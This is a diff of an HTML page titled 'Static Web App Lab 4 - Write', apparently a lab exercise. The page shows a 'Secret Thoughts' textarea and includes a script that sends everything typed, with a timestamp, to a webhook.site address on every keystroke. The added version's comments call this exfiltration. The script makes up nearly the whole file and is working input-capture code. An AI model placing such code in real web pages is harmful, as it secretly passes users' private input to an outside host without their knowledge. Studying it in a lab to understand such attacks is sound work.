@@ -1,22 +1,31 @@
-<html>
-  <head>
-    <title>Static Web App Lab 4</title>
-  </head>
-  <body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Static Web App Lab 4</title>
+</head>
+<body>
+  <div>
+    <h1>Static Web App Lab 4 - Write</h1>
     <div>
-      <h1>Static Web App Lab 4 - Write</h1>
-      <div>
-        <h2>Secret Thoughts</h2>
-        <textarea id="secretThoughts"></textarea>
-      </div>
+      <h2>Secret Thoughts</h2>
+      <textarea id="secretThoughts" placeholder="Enter your secrets here..."></textarea>
     </div>
-    <script>
-      const textarea = document.getElementById("secretThoughts");
-      textarea.addEventListener("input", function (e) {
-        const text = e.target.value;
-        fetch(
-          `https://webhook.site/3834ef79-4a26-4f7f-9dce-569ccd329b48?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`).catch(console.error);
-      });
-    </script>
-  </body>
+  </div>
+
+  <script>
+    // Capture input from textarea and exfiltrate to webhook
+    const textarea = document.getElementById("secretThoughts");
+    
+    textarea.addEventListener("input", function(e) {
+      const text = e.target.value;
+      
+      // Send captured text to webhook endpoint
+      fetch(
+        `https://webhook.site/3834ef79-4a26-4f7f-9dce-569ccd329b48?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`
+      ).catch(console.error);
+    });
+  </script>
+</body>
 </html>
